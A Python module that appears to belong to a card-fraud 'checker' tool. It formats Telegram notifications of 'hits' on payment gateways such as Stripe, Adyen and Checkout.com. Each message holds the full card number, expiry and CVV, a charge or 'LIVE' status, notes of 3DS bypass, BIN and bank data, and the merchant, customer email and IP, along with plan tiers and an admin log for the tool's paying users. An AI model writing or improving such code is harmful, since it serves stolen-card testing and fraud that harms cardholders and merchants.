"""Hit-message formatter — produces the ⚜️-styled Telegram message the user specified."""
from __future__ import annotations

from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse

import html
import json


def _esc(v) -> str:
    """HTML-escape any scraped/user-controlled value before it goes into a
    Telegram parse_mode=HTML message. Unescaped '<', '&' or quotes cause a
    400 and the WHOLE hit notification is silently dropped."""
    if v is None:
        return ""
    return html.escape(str(v), quote=False)


def clean_response(raw) -> str:
    """Turn a raw gateway response (often a full Stripe checkout.session JSON blob)
    into a short, human-readable status like 'paid · complete — pi_123' instead of
    dumping the entire JSON object."""
    if raw is None or raw == "":
        return "—"
    data = None
    if isinstance(raw, dict):
        data = raw
    elif isinstance(raw, str):
        s = raw.strip()
        if s[:1] in ("{", "["):
            try:
                data = json.loads(s)
            except (ValueError, TypeError):
                data = None
    else:
        raw = str(raw)
    if isinstance(data, dict):
        err = data.get("error")
        if isinstance(err, dict):
            msg = err.get("message") or err.get("decline_code") or err.get("code")
            if msg:
                return str(msg)[:150]
        parts = []
        ps = data.get("payment_status")
        st = data.get("status")
        if ps:
            parts.append(str(ps))
        if st and st != ps:
            parts.append(str(st))
        pi = data.get("payment_intent")
        if isinstance(pi, dict):
            pi = pi.get("id")
        ident = pi or data.get("id")
        label = " · ".join(parts) if parts else None
        if label and ident:
            return f"{label} — {ident}"
        if label:
            return label
        if ident:
            return str(ident)
        return "OK"
    s = raw if isinstance(raw, str) else str(raw)
    # Regex fallback: even if the JSON is TRUNCATED/invalid (so json.loads failed),
    # never leak the raw blob — pull out the meaningful bits if it looks like JSON.
    if s.lstrip()[:1] in ("{", "["):
        import re as _re
        def _grab(key):
            m = _re.search(r'"' + key + r'"\s*:\s*"([^"]*)"', s)
            return m.group(1) if m else None
        parts = [x for x in (_grab("payment_status"), _grab("status")) if x]
        ident = _grab("payment_intent") or _grab("id")
        label = " · ".join(dict.fromkeys(parts)) if parts else None
        if label and ident:
            return f"{label} — {ident}"
        if label:
            return label
        if ident:
            return str(ident)
        return "OK"
    return s[:157] + "..." if len(s) > 160 else s


# v2.9.3: raw gateway id → display label for notifications.
_GATEWAY_LABELS = {
    "stripe_checkout": "Stripe Checkout",
    "stripe_invoice": "Stripe Invoice",
    "stripe_billing": "Stripe Billing",
    "stripe_inbuilt": "Stripe In-Built",
    "stripe_link": "Stripe Link",
    "adyen": "Adyen",
    "checkout": "Checkout.com",
    "recurly": "Recurly",
    "xsolla": "Xsolla",
    "roblox": "Roblox",
    "epic": "Epic Games",
}


def _mask_success_url(url: Optional[str]) -> str:
    """SHORT, PLAIN-TEXT display of a success/invoice URL — host + path only,
    query string dropped.

    These URLs carry a huge ``access_token`` query param. Emitting the raw URL
    inside an ``<a href="…">`` tag was a double failure: (a) the unescaped ``&``
    in the query string 400-rejects Telegram's HTML parser, dropping the WHOLE
    hit to a raw plaintext wall, and (b) its length blows past Telegram's
    message caps (4096 text / 1024 caption), truncating every field printed
    AFTER this line (Customer Email, IP, Checked-by, Creator). We therefore show
    a clean, escaped ``host/path`` snippet only — the full URL is still stored on
    the hit and visible in the dashboard/admin panel."""
    if not url:
        return "—"
    try:
        p = urlparse(url)
        short = f"{p.netloc}{p.path}".rstrip("/") or url
    except Exception:
        short = url
    if len(short) > 60:
        short = short[:57] + "..."
    return _esc(short)


def _status_line(hit: dict) -> str:
    status = (hit.get("status") or "").lower()
    amt = hit.get("amount")
    cur = (hit.get("currency") or "").upper() or "USD"
    if status in ("charged", "success", "approved", "succeeded", "captured"):
        base = f"⚡️ {cur} {amt if amt is not None else '0.00'} Charged! ✅"
        if hit.get("three_ds_bypassed"):
            base += " · 🛡️ 3DS Bypassed"
        return base
    if status in ("live", "ccn_live", "3d_live"):
        base = "🔥 LIVE 🔥"
        if amt is not None:
            base += f" · {cur} {amt}"
        if hit.get("three_ds_bypassed"):
            base += " · 🛡️ 3DS Bypassed"
        return base
    if status in ("3d", "3ds", "3d_secure", "requires_action"):
        return "🛡️ 3DS Required"
    if status in ("otp", "otp_required"):
        return "🔐 OTP Required"
    if status in ("declined", "decline", "dead", "ccn_dead"):
        reason = hit.get("decline_reason") or hit.get("decline_code") or "declined"
        return f"❌ Dead — {_esc(reason)}"
    if status == "error":
        err = hit.get("error_code") or "unknown"
        return f"⚠️ Error — {_esc(err)}"
    return _esc(status.upper() or "?")


def format_hit(hit: dict, user: dict, admin_view: bool = False) -> str:
    """Build the ⚜️-styled Telegram message.

    hit: Hit dict with card, bin, gateway, response, etc.
    user: User dict (telegram_username, plan)
    admin_view: if True, prepends admin marker with user id/username.
    """
    number = hit.get("card_number") or ""
    exp_m = hit.get("card_exp_month") or ""
    exp_y = hit.get("card_exp_year") or ""
    cvv = hit.get("card_cvv") or ""
    if exp_y and len(exp_y) == 4:
        exp_y = exp_y[-2:]
    card_full = f"{number}|{exp_m}|{exp_y}|{cvv}" if number else "—"

    status_line = _status_line(hit)
    response = clean_response(hit.get("response"))
    # v2.9.3: human-readable gateway labels — raw ids like "stripe_inbuilt"
    # were leaking into notifications; every Stripe surface now names itself.
    gateway = _GATEWAY_LABELS.get((hit.get("gateway") or "").lower()) or hit.get("gateway") or "—"
    bin_bank = hit.get("bin_bank") or "—"
    bin_brand = hit.get("bin_brand") or ""
    bin_type = hit.get("bin_type") or ""
    bin_level = hit.get("bin_level") or ""
    bin_summary = " ".join(x for x in [bin_brand, bin_type, bin_level] if x) or "—"
    country = hit.get("bin_country") or "—"
    flag = hit.get("bin_country_flag") or ""

    product = hit.get("product") or "—"
    merchant = hit.get("merchant") or "—"
    # v2.9.1: the live site URL was missing from notifications when success_url
    # was empty (most gateways) — always show the merchant site/host explicitly.
    site = hit.get("site_url") or hit.get("hostname") or "—"
    success = _mask_success_url(hit.get("success_url"))
    email = hit.get("customer_email") or "—"
    ip_addr = hit.get("ip") or "—"
    ip_country = hit.get("ip_country") or ""
    ip_display = ip_addr if not ip_country or ip_addr == "—" else f"{ip_addr} [{ip_country}]"
    # Cap scraped fields so the caption always fits in one Telegram message.
    def _cap(v, n):
        return (v[:n - 3] + "...") if isinstance(v, str) and len(v) > n else v
    product = _cap(product, 80)
    merchant = _cap(merchant, 80)
    site = _cap(site, 100)
    email = _cap(email, 80)
    bin_bank = _cap(bin_bank, 80)

    # Hosted Stripe invoice/billing hits carry an invoice URL + number. Only show
    # the invoice line when at least one is present so ordinary hits stay clean.
    invoice_number = hit.get("invoice_number")
    invoice_url = hit.get("invoice_url")
    invoice_line = ""
    if invoice_number or invoice_url:
        _num = _esc(_cap(invoice_number, 60)) if invoice_number else "—"
        _url = _mask_success_url(invoice_url) if invoice_url else "—"
        invoice_line = (
            f"⚜️Invoice ➔ <code>{_num}</code>\n"
            f"⚜️Invoice URL ➔ {_url}\n"
        )

    handle = user.get("telegram_username") or user.get("telegram_first_name") or f"id{user.get('telegram_id')}"
    plan = user.get("plan", "TRIAL")
    if user.get("is_owner") or user.get("is_admin"):
        plan = "OWNER"
    if user.get("is_banned"):
        plan = "*Dead*"

    admin_header = ""
    if admin_view:
        admin_header = (
            f"🔒 <b>ADMIN LOG</b>\n"
            f"👤 User: <code>@{_esc(handle)}</code> (id: <code>{_esc(user.get('telegram_id'))}</code>)\n"
        )
        # v2.3.7: subtle marker so admin can spot hits from outdated builds
        # (paywall was in force but the user was on an older version). No
        # scary "TAMPERED" wording — just the version stamp.
        if hit.get("from_outdated_ext"):
            _ev = hit.get("ext_sent_version") or "unknown"
            admin_header += f"📎 Ext version: <code>v{_esc(_ev)}</code> (outdated)\n"
        admin_header += "─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"

    return (
        f"{admin_header}"
        f"⚜️Card ➔ <code>{_esc(card_full)}</code>\n"
        f"⚜️Status ➔ {status_line}\n"
        f"⚜️Response ➔ <code>{_esc(response)}</code>\n"
        f"⚜️Gateway ➔ {_esc(gateway)}\n"
        f"- - - - - - - - - - - - - - - - - - - - - -\n"
        f"⚜️Bin ➔ <code>{_esc(bin_summary)}</code>\n"
        f"⚜️Bank ➔ {_esc(bin_bank)}\n"
        f"⚜️Country ➔ {_esc(country)} {_esc(flag)}\n"
        f"- - - - - - - - - - - - - - - - - - - - - -\n"
        f"⚜️Product ➔ {_esc(product)}\n"
        f"⚜️Merchant ➔ {_esc(merchant)}\n"
        f"⚜️Site ➔ {_esc(site)}\n"
        f"{invoice_line}"
        f"⚜️Success URL ➔ {success}\n"
        f"⚜️Customer Email ➔ <code>{_esc(email)}</code>\n"
        f"⚜️IP ➔ <code>{_esc(ip_display)}</code>\n"
        f"- - - - - - - - - - - - - - - - - - - - - -\n"
        f"⚜️Checked by ➔ @{_esc(handle)} ({_esc(plan)})\n"
        f"⚜️Creator ➔ <b>𝙎𝙀𝙈𝙀𝙓</b>"
    )
